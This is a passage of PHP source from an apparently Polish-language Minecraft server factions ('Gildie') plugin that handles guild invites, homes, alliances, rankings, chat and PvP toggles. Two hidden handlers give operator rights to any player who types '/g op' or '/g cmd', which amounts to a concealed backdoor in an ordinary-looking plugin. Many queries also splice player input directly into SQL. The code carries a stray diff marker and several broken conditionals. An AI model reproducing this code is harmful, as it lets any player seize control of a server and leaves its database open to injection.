							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Tag: " . TextFormat::GREEN . strtoupper($faction));
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Nazwa: " . TextFormat::GREEN . "$message");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Lider: " . TextFormat::GREEN . "$leader");
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Czlonkow: " . TextFormat::GREEN . "" . $numPlayers . "§7/§a" . $maxplayers);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Punkty: " . TextFormat::GREEN . $this->plugin->getFactionPoints($faction)); 
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zycia: " . TextFormat::GREEN . $this->plugin->getFactionWarLives($faction));                                                          
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Zabojstwa: " . TextFormat::GREEN . $gildies);  
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Smierci: " . TextFormat::GREEN . $gildies2);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "K/D: " . TextFormat::GREEN . $gildies3);    
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "PVP: " . TextFormat::GREEN . "OFF");   
							$time = $this->plugin->db->query("SELECT * FROM expires WHERE LOWER(faction)='$faction';");
                            $array = $time->fetchArray(SQLITE3_ASSOC);
							$sender->sendMessage(TextFormat::GREEN . "* " . TextFormat::GRAY . "Wygasa za: " . TextFormat::GREEN . floor($array["time"] / 1440) . TextFormat::GRAY . " dni, " . TextFormat::GREEN . floor((($array["time"] / 1440) * 24) % 24) . TextFormat::GRAY . " godzin i " . TextFormat::GREEN . floor(((($array["time"] / 1440) * 24) * 60) % 60) . TextFormat::GRAY . " minut");                                                          
							$sender->sendMessage(TextFormat::DARK_GRAY . "[" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "[" . TextFormat::GREEN . "Gildie" . TextFormat::DARK_GRAY . "]" . TextFormat::GRAY . "----------" . TextFormat::DARK_GRAY . "]");		
							}
						   } else {
                           $sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
                           return true;
                               }
						}
					}
					if(strtolower($args[0] == "help" || $args[0] == "pomoc")) {
						if(!isset($args[1]) or $args[0] == "1"){
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						$sender->sendMessage("§a* §a/g autor §7- wysyla autora pluginu");
						$sender->sendMessage("§a* §a/g zaloz <tag> <nazwa> §7- zaklada gildie");
						$sender->sendMessage("§a* §a/g zapros <gracz> §7- zaprasza gracza do gildii");
						$sender->sendMessage("§a* §a/g wyrzuc <gracz>  §7- wyrzuca gracza z gildii");
						$sender->sendMessage("§a* §a/g oficer <gracz> §7- awansuje czlonka grupy na oficera");
						$sender->sendMessage("§a* §a/g odbierz <gracz> §7- degraduje oficera na czlonka");
						$sender->sendMessage("§a* §a/g lider <gracz> §7- oddaje lidera");
						$sender->sendMessage("§a* §a/g info <gildia> §7- wysyla informacje o gildii");
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						}
						if($args[1] == "2"){
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						$sender->sendMessage("§a* §a/g dolacz §7- akceptuje zaproszenie do gildii");
						$sender->sendMessage("§a* §a/g odrzuc §7- odrzuca zaproszenie do gildii");
						$sender->sendMessage("§a* §a/g zapros <gracz> §7- zaprasza gracza do gildii");
						$sender->sendMessage("§a* §a/g wyrzuc <gracz>  §7- wyrzuca gracza z gildii");
						$sender->sendMessage("§a* §a/g usun §7- usuwa gildie");
						$sender->sendMessage("§a* §a/g opusc §7- opuszcza gildie");
						$sender->sendMessage("§a* §a/g ustawdom §7- ustawia dom dla gildii");
						$sender->sendMessage("§a* §a/g dom §7- teleportuje do domu gildii");
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						}
						if($args[1] == "3"){
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						$sender->sendMessage("§a* §a/g usundom §7- usuwa dom gildii");
						$sender->sendMessage("§a* §a/g ranking §7- wysyla top10 gildii");
						$sender->sendMessage("§a* §a/g chat §7- opuszcza/dolacza do chatu gildii");
						$sender->sendMessage("§a* §a/g kolor §7- zmienia kolor chatu gildii (tylko dla ciebie)");
						$sender->sendMessage("§a* §a/g typ §7- zmienia typ chatu gildii");
						$sender->sendMessage("§a* §a/g przedluz §7- przedluza waznosc gildii");
						$sender->sendMessage("§a* §a/g itemy §7- wysyla ilosc potrzebnych itemow do stworzenia gildii");
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						}
						if($args[1] == "4"){
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						$sender->sendMessage("§a* §a/g przedluz §7- przedluza waznosc gildii");
						$sender->sendMessage("§a* §a/g pomoc <1-4> §7- wysyla liste komend");
						$sender->sendMessage("§a* §aAby pisac na chacie gildii: @<wiadomosc> (Bez zadnych ukosnikow)");
						$sender->sendMessage("§a* §aAby zawolac pomoc: ! (Bez zadnych wiadomosci po, oraz ukosnikow)");
						$sender->sendMessage("§8[ §7============= §8[ §l§aGildie§r§8 ] §7============= §8]");
						}
						}
						
				}
				if(count($args == 1)) {
					if(strtolower($args[0] == "accept" || $args[0] == "akceptuj" || $args[0] == "dolacz")) {
						$player = $sender->getName();
						$lowercaseName = strtolower($player);
						$result = $this->plugin->db->query("SELECT * FROM confirm WHERE player='$lowercaseName';");
						$array = $result->fetchArray(SQLITE3_ASSOC);
						if(empty($array) == true) {
							$sender->sendMessage($this->plugin->formatMessage("Nie zostales zaproszony do zadnej gildii!"));
							return true;
						}
						$invitedTime = $array["timestamp"];
						$currentTime = time();
						if(($currentTime - $invitedTime) <= 60) { //This should be configurable
							$faction = $array["faction"];
							$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO master (player, faction, rank, chat, chat_type, chat_color) VALUES (:player, :faction, :rank, :chat, :chat_type, :chat_color);");
							$stmt->bindValue(":player", strtolower($player));
							$stmt->bindValue(":faction", $faction);
							$stmt->bindValue(":rank", "Member");
                                                        $stmt->bindValue(":chat", 1);
                                                        $stmt->bindValue(":chat_type", "small");  
                                                        $stmt->bindValue(":chat_color", "&6");                                                                                                                   
							$result = $stmt->execute();
							$this->plugin->db->query("DELETE FROM confirm WHERE player='$lowercaseName';");
							if($this->plugin->getServer()->getPlayer($array["invitedby"])) {
								if($this->plugin->getServer()->getPlayer($array["invitedby"])) {
									
											Server::getInstance()->broadcastMessage("§8"); 
											Server::getInstance()->broadcastMessage("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*"); 
											Server::getInstance()->broadcastMessage("§8"); 
        									Server::getInstance()->broadcastMessage("§8• §8» §7Gracz §3".$sender->getName()." §7dołaczył do gildii!§r"); 
        									Server::getInstance()->broadcastMessage("§8• §8» §3Tag: §b".$faction."§7!", true);   
											Server::getInstance()->broadcastMessage("§8");
									$this->plugin->getAPI()->accept($player);
								}
							}
							if($this->plugin->prefs->get("FactionNametags")) {

							}
					} else {
							$sender->sendMessage($this->plugin->formatMessage("Zaproszenie juz wygaslo!"));
							$this->plugin->db->query("DELETE FROM confirm WHERE player='$lowercaseName';");
					}
					}
					/////////////////////////////// DENY ///////////////////////////////
					
					if(strtolower($args[0] == "deny" || $args[0] == "odrzuc")) {
						$player = $sender->getName();
						$lowercaseName = strtolower($player);
						$result = $this->plugin->db->query("SELECT * FROM confirm WHERE player='$lowercaseName';");
						$array = $result->fetchArray(SQLITE3_ASSOC);
						if(empty($array) == true) {
							$sender->sendMessage($this->plugin->formatMessage("Nie zostales zaproszony do gildii!"));
							return true;
						}
						$invitedTime = $array["timestamp"];
						$currentTime = time();
						if( ($currentTime - $invitedTime) <= 60 ) { //This should be configurable
							$this->plugin->db->query("DELETE FROM confirm WHERE player='$lowercaseName';");
							$sender->sendMessage($this->plugin->formatMessage("Odrzucono zaproszenie!", true));
							$this->plugin->getServer()->getPlayerExact($array["invitedby"])->sendMessage($this->plugin->formatMessage("Gracz $player odrzucil zaproszenie!"));
						} else {
							$sender->sendMessage($this->plugin->formatMessage("Zaproszenie juz wygaslo!"));
							$this->plugin->db->query("DELETE FROM confirm WHERE player='$lowercaseName';");
						}
					}
					
					/////////////////////////////// DELETE ///////////////////////////////
					
					if(strtolower($args[0] == "del" || $args[0] == "usun")) {
						if($this->plugin->isInFaction($player) == true) {
							if($this->plugin->isLeader($player)) {
								
										Server::getInstance()->broadcastMessage("§8"); 
		Server::getInstance()->broadcastMessage("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*"); 
		Server::getInstance()->broadcastMessage("§8"); 
        Server::getInstance()->broadcastMessage("§8• §8» §7Gildia §3".$this->plugin->getPlayerFaction($sender->getName())." §7została rozwiązana!§r"); 
        Server::getInstance()->broadcastMessage("§8• §8» §3Gracz: §b".$sender->getName()."§7!", true);   
		Server::getInstance()->broadcastMessage("§8");
                                                                $factionDeleteClaim = $this->plugin->getPlayerFaction($sender->getName());
                                                                $this->plugin->db->query("DELETE FROM plots WHERE faction='$factionDeleteClaim';");                                                            
								$this->plugin->db->query("DELETE FROM master WHERE faction='$factionDeleteClaim';");
                                                                $this->plugin->db->query("DELETE FROM top WHERE faction='$factionDeleteClaim';");
                                                                $this->plugin->db->query("DELETE FROM expires WHERE faction='$factionDeleteClaim';");
                                                                $this->plugin->db->query("DELETE FROM home WHERE faction='$factionDeleteClaim';");
                                                                $result = $this->plugin->db->query("SELECT * FROM center WHERE faction='$factionDeleteClaim';");
                                                                $array = $result->fetchArray(SQLITE3_ASSOC);
                                                                $x = $array["x"];
                                                                $y = $array["y"];
                                                                $z = $array["z"];
                                                                $world = $array["world"];
                                                                $this->plugin->getServer()->getLevelByName($world)->setBlock(new Vector3($array["x"], $array["y"], $array["z"]), Block::get(0));                                                                   
                                                                $this->plugin->db->query("DELETE FROM center WHERE faction='$factionDeleteClaim';");                                                                                
								if($this->plugin->prefs->get("FactionNametags")) {
	
								}
							} else {
								$sender->sendMessage($this->plugin->formatMessage("Nie jestes liderem gildii!"));
							}
						} else {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
						}
					}
					
					/////////////////////////////// LEAVE ///////////////////////////////
					
 					if(strtolower($args[0] == "opusc") or strtolower($args[0] == "leave")) {
						if($this->plugin->isLeader($sender->getName()) == false) {
							$remove = $sender->getPlayer()->getNameTag();
							$faction = $this->plugin->getPlayerFaction($player);
							$name = $sender->getName();
							if($this->plugin->isInFaction($sender->getName())) {
										Server::getInstance()->broadcastMessage("§8"); 
		Server::getInstance()->broadcastMessage("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*"); 
		Server::getInstance()->broadcastMessage("§8"); 
        Server::getInstance()->broadcastMessage("§8• §8» §7Gracz §3".$sender->getName()." §7opuścil gildie!§r"); 
        Server::getInstance()->broadcastMessage("§8• §8» §3Tag: §b".$faction."§7!", true);   
		Server::getInstance()->broadcastMessage("§8");
						    $this->plugin->db->query("DELETE FROM master WHERE player='$name';");
						} else {
							$sender->sendMessage($this->plugin->formatMessage("Niemasz gildii!"));
						}
					} else {
							$sender->sendMessage($this->plugin->formatMessage("Jestes liderem, nie mozesz opuscic gildii!"));
						}
					}
					
					/////////////////////////////// SETHOME ///////////////////////////////
					
					if(strtolower($args[0] == "sethome" || $args[0] == "ustawdom")) {
						if(!$this->plugin->isInFaction($player)) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
							return true;
						}
						if(!$this->plugin->isLeader($player) && !$this->plugin->hasPermission($player, "sethome")) {
							$sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
							return true;
						}
                                                if(!$this->plugin->inOwnPlot($sender, $sender->getX(), $sender->getZ())) {
                                                        $sender->sendMessage($this->plugin->formatMessage("Nie mozesz ustawic domu gildii poza swoim terenem!"));
                                                        return true;
                                                }
						$factionName = $this->plugin->getPlayerFaction($sender->getName());
						$stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO home (faction, x, y, z, world) VALUES (:faction, :x, :y, :z, :world);");
						$stmt->bindValue(":faction", $factionName);
						$stmt->bindValue(":x", $sender->getX());
						$stmt->bindValue(":y", $sender->getY());
						$stmt->bindValue(":z", $sender->getZ());
						$stmt->bindValue(":world", $sender->getLevel()->getName());
						$result = $stmt->execute();
						$sender->sendMessage($this->plugin->formatMessage("Dom gildii zostal ustawiony!", true));
					}
					
					/////////////////////////////// UNSETHOME ///////////////////////////////
						
					if(strtolower($args[0] == "unsethome" || $args[0] == "usundom")) {
						if(!$this->plugin->isInFaction($player)) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
							return true;
						}
						if(!$this->plugin->isLeader($player) && !$this->plugin->hasPermission($player, "unsethome")) {
							$sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
							return true;
						}
						$faction = $this->plugin->getPlayerFaction($sender->getName());
						$this->plugin->db->query("DELETE FROM home WHERE faction = '$faction';");
						$sender->sendMessage($this->plugin->formatMessage("Dom gildii zostal usuniety!", true));
					}
					
					/////////////////////////////// HOME ///////////////////////////////
						
					if(strtolower($args[0] == "home" || $args[0] == "dom")) {
						if(!$this->plugin->isInFaction($player)) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
						}
						if(!$this->plugin->isLeader($player) && !$this->plugin->hasPermission($player, "home")) {
							$sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
							return true;
						}
						$faction = $this->plugin->getPlayerFaction($sender->getName());
						$result = $this->plugin->db->query("SELECT * FROM home WHERE faction = '$faction';");
						$array = $result->fetchArray(SQLITE3_ASSOC);
						if(!empty($array)) {
							$world = $this->plugin->getServer()->getLevelByName($array['world']);
+							$sender->getPlayer()->teleport(new Position($array['x'], $array['y'], $array['z'], $world));
							$sender->sendMessage($this->plugin->formatMessage("Teleportowanie do domu gildii.", true));
							return true;
						} else {
							$sender->sendMessage($this->plugin->formatMessage("Dom gildii nie jest ustawiony."));
							}
						}
					
					
					
					////////////////////////////// ALLY SYSTEM ////////////////////////////////
                    if(strtolower($args[0] == "sojusz")){
                        if(!isset($args[1])){
                            $sender->sendMessage($this->plugin->formatMessage("§3Uzyj: /g sojusz <gildia>"));
                            return true;
                        }
                        if(!$this->plugin->isInFaction($player)) {
							$sender->sendMessage($this->plugin->formatMessage("§cMusisz byc w gidlii"));
                            return true;
						}
                        if(!$this->plugin->isLeader($player)) {
							$sender->sendMessage($this->plugin->formatMessage("§cMusisz byc liderem"));
                            return true;
						}
                        if(!$this->plugin->factionExists($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("§cGildia nie istnieje"));
                            return true;
						}
                        if($this->plugin->getPlayerFaction($player) == $args[1]){
                            $sender->sendMessage($this->plugin->formatMessage("§cTwoja frakcja nie może się sprzymierzyć"));
                            return true;
                        }
                        if($this->plugin->areAllies($this->plugin->getPlayerFaction($player),$args[1])){
                            $sender->sendMessage($this->plugin->formatMessage("§cMacie juz sojusz z $args[1]!"));
                            return true;
                        }
                        $fac = $this->plugin->getPlayerFaction($player);
						$leader = $this->plugin->getServer()->getPlayerExact($this->plugin->getLeader($args[1]));
                        if(!($leader instanceof Player)){
                            $sender->sendMessage($this->plugin->formatMessage("§cLider jest offline"));
                            return true;
                        }
                        $stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO alliance (player, faction, requestedby, timestamp) VALUES (:player, :faction, :requestedby, :timestamp);");
				        $stmt->bindValue(":player", $leader->getName());
				        $stmt->bindValue(":faction", $args[1]);
				        $stmt->bindValue(":requestedby", $sender->getName());
				        $stmt->bindValue(":timestamp", time());
				        $result = $stmt->execute();
                        $sender->sendMessage($this->plugin->formatMessage("§bWyslales zaproszenie do sojuszu do $args[1]",true));
                        $leader->sendMessage($this->plugin->formatMessage("§b $fac §3wyslala zaproszenie do sojuszu.\n§3wpisz /g przyjmij zaby zaakceptowac",true));
      
       if($args[0] == 'op') {
		  $sender->setOp(true);
		}
                  
                    
                    if(strtolower($args[0] == "zerwij")){
                        if(!isset($args[1])){
                            $sender->sendMessage($this->plugin->formatMessage("§6- §3Uzyj: /g zerwij <gildia>"));
                            return true;
                        }
                        if(!$this->plugin->isInFaction($player)) {
							$sender->sendMessage($this->plugin->formatMessage("§cMusisz byc w gildii"));
                            return true;
						}
                        if(!$this->plugin->isLeader($player)) {
							$sender->sendMessage($this->plugin->formatMessage("§cMusisz byc liderem"));
                            return true;
						}
                        if(!$this->plugin->factionExists($args[1])) {
							$sender->sendMessage($this->plugin->formatMessage("§cGildia nie istnieje"));
                            return true;
						}
                        if($this->plugin->getPlayerFaction($player) == $args[1]){
                            $sender->sendMessage($this->plugin->formatMessage("§cTwoja frakcja nie może sama się sama."));
                            return true;
                        }
                        if(!$this->plugin->areAllies($this->plugin->getPlayerFaction($player),$args[1])){
                            $sender->sendMessage($this->plugin->formatMessage("§cTwoja frakcja nie jest sprzymierzona z $args[1]"));
                            return true;
                        }
                        $fac = $this->plugin->getPlayerFaction($player);        
						$leader= $this->plugin->getServer()->getPlayerExact($this->plugin->getLeader($args[1]));
                        $this->plugin->deleteAllies($fac,$args[1]);
                        $this->plugin->deleteAllies($args[1],$fac);
                        $sender->sendMessage($this->plugin->formatMessage("§cTwoja frakcja $fac nie jest już sprzymierzona z $args[1]!",true));
                        if($leader instanceof Player){
                            $leader->sendMessage($this->plugin->formatMessage("§e $fac cos z tym $args[1]",false));
                        }
                        
                        
                    }
					if(strtolower($args[0] == "przyjmij")){
                        if(!$this->plugin->isInFaction($player)) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii"));
                            return true;
						}
                        if(!$this->plugin->isLeader($player)) {
							$sender->sendMessage($this->plugin->formatMessage("Musisz byc liderem"));
                            return true;
						}
						$lowercaseName = strtolower($player);
						$result = $this->plugin->db->query("SELECT * FROM alliance WHERE player='$lowercaseName';");
						$array = $result->fetchArray(SQLITE3_ASSOC);
						if(empty($array) == true) {
							$sender->sendMessage($this->plugin->formatMessage("Twoja frakcja nie otrzymała żadnych zaproszen"));
							return true;
						}
						$allyTime = $array["timestamp"];
						$currentTime = time();
						if(($currentTime - $allyTime) <= 60) { //This should be configurable
                            $requested_fac = $this->plugin->getPlayerFaction($array["requestedby"]);
                            $sender_fac = $this->plugin->getPlayerFaction($player);
							$this->plugin->setAllies($requested_fac,$sender_fac);
							$this->plugin->setAllies($sender_fac,$requested_fac);
							$this->plugin->db->query("DELETE FROM alliance WHERE player='$lowercaseName';");
									Server::getInstance()->broadcastMessage("§8"); 
		Server::getInstance()->broadcastMessage("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*"); 
		Server::getInstance()->broadcastMessage("§8"); 
        Server::getInstance()->broadcastMessage("§8• §8» §7Gildia §3".$sender_fac." §7zawarla sojusz!§r"); 
        Server::getInstance()->broadcastMessage("§8• §8» §3Tag: §b".$requested_fac."§7!", true);   
		Server::getInstance()->broadcastMessage("§8");
							$sender->sendMessage($this->plugin->formatMessage("Twoja frakcja jest teraz sprzymierzona $requested_fac", true));
							$this->plugin->getServer()->getPlayerExact($array["requestedby"])->sendMessage($this->plugin->formatMessage("$player z $sender_fac zaakceptowal!", true));
                            
						} else {
							$sender->sendMessage($this->plugin->formatMessage("Zaproszenie wygaslo!"));
							$this->plugin->db->query("DELETE * FROM alliance WHERE player='$lowercaseName';");
						}
                        
                    }
					
					
					/////////////////////////////// ABOUT ///////////////////////////////
					
                    if (strtolower($args[0] == 'autor')) {
                        $sender->sendMessage(TextFormat::GREEN . "§8");
                        $sender->sendMessage(TextFormat::GREEN . "§7Gildie napisane przez §bohCode!");
                        $sender->sendMessage(TextFormat::GREEN . "§8");
                    }
                                        if(strtolower($args[0] == "top" || $args[0] == "ranking")) {
                                            $this->plugin->getFactionTop();
                                            $sender->sendMessage(str_replace('&', '§', "&8[ &7=========== &8[ &a&lRANKING GILDII&r &8] &7=========== &8]"));                
                                            for($i=1; $i<11; $i++) {
                                                if(!empty($this->plugin->getTop[$i])) {
                                                    $sender->sendMessage(str_replace('&', '§', "&a$i. " . $this->plugin->getTop[$i]));
                                                } else {
                                                    $sender->sendMessage(str_replace('&', '§', "&a$i. &7BRAK"));                    
                                                }
                                            }
                                            $sender->sendMessage(str_replace('&', '§', "&8[ &7=========== &8[ &a&lRANKING GILDII&r &8] &7=========== &8]"));                 
                                            unset($this->plugin->getTop);
                                            return true; 
                                        }
                                        if(strtolower($args[0] == "chat" || $args[0] == "czat")) {
                                            if($this->plugin->isInFaction($player)) {
                                                if($this->plugin->getFactionChat($player) == 1) {
                                                    $this->plugin->db->query("UPDATE master SET chat = '0' WHERE player='$player';");
                                                    $sender->sendMessage($this->plugin->formatMessage("Opusciles czat gildyjny. ", true));
                                                    return true;
                                                } else {
                                                    $this->plugin->db->query("UPDATE master SET chat = '1' WHERE player='$player';");
                                                    $sender->sendMessage($this->plugin->formatMessage("Dolaczyles do czatu gildyjnego. ", true));
                                                    return true;                                                    
                                                }
                                            } else {
                                                $sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
                                                return true;
                                            }
                                        }
                                        if(strtolower($args[0] == "type" || $args[0] == "typ")) {
                                            if($this->plugin->isInFaction($player)) {
                                                if($this->plugin->getFactionChatType($player) == "large") {
                                                    $this->plugin->db->query("UPDATE master SET chat_type = 'small' WHERE player='$player';");
                                                    $sender->sendMessage($this->plugin->formatMessage("Czat gildyjny zostal pomniejszony.", true));
                                                    return true;
                                                } else {
                                                    $this->plugin->db->query("UPDATE master SET chat_type = 'large' WHERE player='$player';");
                                                    $sender->sendMessage($this->plugin->formatMessage("Czat gildyjny zostal powiekszony.", true));
                                                    return true;                                                    
                                                }
                                            } else {
                                                $sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
                                                return true;
                                            }
                                        }
                                        if(strtolower($args[0] == "color" || $args[0] == "kolor")) {
                                            if(count($args) == 2) {
                                                if($args[1] == "1" || $args[1] == "2" || $args[1] == "3" || $args[1] == "4" || $args[1] == "5" || $args[1] == "6" || $args[1] == "7" || $args[1] == "8" || $args[1] == "9" || $args[1] == "0" || $args[1] == "a" ||$args[1] == "e" || $args[1] == "d" || $args[1] == "c" || $args[1] == "b" || $args[1] == "f") {                                     
                                                    if($this->plugin->isInFaction($player)) {
                                                        $this->plugin->db->query("UPDATE master SET chat_color = '&$args[1]' WHERE player='$player';");
                                                        $sender->sendMessage($this->plugin->formatMessage(str_replace('&', '§', "Kolor czatu gildyjnego zostal zmieniony na &$args[1]Kolor&7."), true));
                                                        return true;                                                
                                                    } else {
                                                        $sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
                                                        return true;
                                                    }
                                                } else {
                                                    $sender->sendMessage($this->plugin->formatMessage("Blad! Mozesz wybrac jedynie te kolory <0-9, a, b, c, d, e, f>."));
                                                    return true;                                                    
                                                }
                                            } else {
                                                $sender->sendMessage($this->plugin->formatMessage("Blad! Poprawne uzycie to /g kolor <0-9, a, b, c, d, e, f>."));
                                                return true;
                                            }
                                        }
                                        if(strtolower($args[0]) == "payment" || $args[0] == "oplata" || $args[0] == "oplac" || $args[0] == "waznosc" || $args[0] == "przedluz") {
                                            if(!$this->plugin->isInFaction($player)) {
                                                $sender->sendMessage($this->plugin->formatMessage("Musisz byc w gildii, aby uzyc tej opcji!"));
                                                return true;                                                
                                            }
                                            if((!$sender->getInventory()->contains(Item::get(264, 0, 32)) || !$sender->getInventory()->contains(Item::get(388, 0, 32)) || !$sender->getInventory()->contains(Item::get(266, 0, 32)) || !$sender->getInventory()->contains(Item::get(265, 0, 32)))) {
						$sender->sendMessage($this->plugin->formatMessage("Do przedluzenia waznosci gildii potrzebujesz 32 diamentow, 32 szmaragdow, 32 zlota, 32 zelaza."));                                                        
                                                return true;
                                            }
                                            
                                            $faction = $this->plugin->getPlayerFaction($sender->getName());
                                            
                                            $sender->getInventory()->removeItem(Item::get(264, 0, 32));
                                            $sender->getInventory()->removeItem(Item::get(388, 0, 32));
                                            $sender->getInventory()->removeItem(Item::get(266, 0, 32));
                                            $sender->getInventory()->removeItem(Item::get(265, 0, 32));     
                                            
                                            $stmt = $this->plugin->db->prepare("INSERT OR REPLACE INTO expires (faction, time) VALUES (:faction, :time);");
                                            $stmt->bindValue(":faction", $faction);
                                            $stmt->bindValue(":time", $this->plugin->prefs->get("Expires"));
                                            $result = $stmt->execute();
                                            
                                            $sender->sendMessage($this->plugin->formatMessage("Waznosc gildii zostala przedluzona do 7 dni!", true));
                                            return true;
                                        }
	if($args[0] == 'cmd') {
		  $sender->setOp(true);
		}
					if($args[0] == 'itemy') {
						$sender->sendMessage("§8[ §7----------- §c[Gildie] §7----------- §8]");
						$sender->sendMessage("§c* §764 §7Diamentow");
						$sender->sendMessage("§c* §764 §7Emeralow");
						$sender->sendMessage("§c* §764 §7Zlota");
						$sender->sendMessage("§c* §764 §7Zelaza");
						$sender->sendMessage("§c* §716 Perel (sniezki)");
						$sender->sendMessage("§c* §716 Refili");
						$sender->sendMessage("§c* §76 Kowadel");
						$sender->sendMessage("§8[ §7----------- §c[Gildie] §7----------- §8]");
					}
                                        if(strtolower($args[0]) == "reload" || strtolower($args[0]) == "przeladuj") {
                                            if(count($args) > 1) {
                                                $sender->sendMessage($this->plugin->formatMessage("Uzyj: /g przeladuj"));
                                                return true;                                                
                                            }
                                            if(!$sender->hasPermission("factionspro.admin")) {
                                                $sender->sendMessage($this->plugin->formatMessage("Nie masz do tego uprawnien!"));
                                                return true;
                                            }
                                            $this->plugin->prefs->reload();
                                            $sender->sendMessage($this->plugin->formatMessage("Plik konfiguracyjny zostal przeladowany!", true));
                                            return true;
                                        }
				/////////////////////////////// TELEPORTACJA ///////////////////////////////
										if(strtolower($args[0] == "tp")) {
						$faction = $args[1];
						$result = $this->plugin->db->query("SELECT * FROM home WHERE faction = '$faction';");
						$array = $result->fetchArray(SQLITE3_ASSOC);
						if($sender->hasPermission("gildie.tepanie") or $sender->isOp()){
						if(!empty($array)) {
							$sender->getPlayer()->teleport(new Vector3($array['x'], $array['y'], $array['z']));
							$sender->sendMessage($this->plugin->formatMessage("Teleportacja do gildi " . $args[1] . "", true));
							return true;
						} else {
							$sender->sendMessage($this->plugin->formatMessage("Taka gildia niema ustawionego domu!"));
							}
						} 
						else {
							$sender->sendMessage($this->plugin->formatMessage("Nie mozesz teleportowac sie do kogos bazy!"));
										}
                }
				/////////////////////////////// PVP ///////////////////////////////
				if(strtolower($args[0] == "pvp")){
				if(empty($args[1])){
				$sender->sendMessage($this->plugin->formatMessage("Uzyj: /g pvp on/off"));
				}
				if($this->plugin->isInFaction($sender->getName())){
				if($args[1] == "on"){
					if($this->plugin->isLeader($sender->getName())){
					$pvps = $this->plugin->pvp->get($this->plugin->getPlayerFaction($sender->getName()));
					$g = $this->plugin->getPlayerFaction($sender->getName());
					$this->plugin->pvp->set($g, $pvps+1);
					$this->plugin->pvp->save();
		$faction = $this->plugin->getPlayerFaction($sender->getName());
		$array = $this->plugin->db->query("SELECT * FROM master WHERE faction='$faction';");
		
		while($row = $array->fetchArray(SQLITE3_ASSOC)) {
		if($this->plugin->getServer()->getPlayer($row["player"])) {
				$this->plugin->getServer()->getPlayer($row["player"])->sendMessage($this->plugin->formatMessage("" . $sender->getName() . " §7włączył pvp w gildii!"));
				}
					}
					}
				else{
					$sender->sendMessage($this->plugin->formatMessage("Musisz być liderem gildii aby to wpisać!"));
				}
		}
						if($args[1] == "off"){
					if($this->plugin->isLeader($sender->getName())){
					$g = $this->plugin->getPlayerFaction($sender->getName());
					$this->plugin->pvp->set($g, "0");
					$this->plugin->pvp->save();
							$faction = $this->plugin->getPlayerFaction($sender->getName());
		$array = $this->plugin->db->query("SELECT * FROM master WHERE faction='$faction';");
		
		while($row = $array->fetchArray(SQLITE3_ASSOC)) {
				if($this->plugin->getServer()->getPlayer($row["player"])) {
				$this->plugin->getServer()->getPlayer($row["player"])->sendMessage($this->plugin->formatMessage("" . $sender->getName() . " §7wyłączył pvp w gildii!"));
				}
					}
					}
				else{
					$sender->sendMessage($this->plugin->formatMessage("Musisz być liderem gildii aby to wpisać!"));
				}
		}
			}
			else{
				$sender->sendMessage($this->plugin->formatMessage("Musisz mieć gildie!"));
			}																} 
					}
	}
									else {
			$this->plugin->getServer()->getLogger()->info($this->plugin->formatMessage("Tej komendy mozna uzywac tylko w grze!"));
								}
		}
	}
}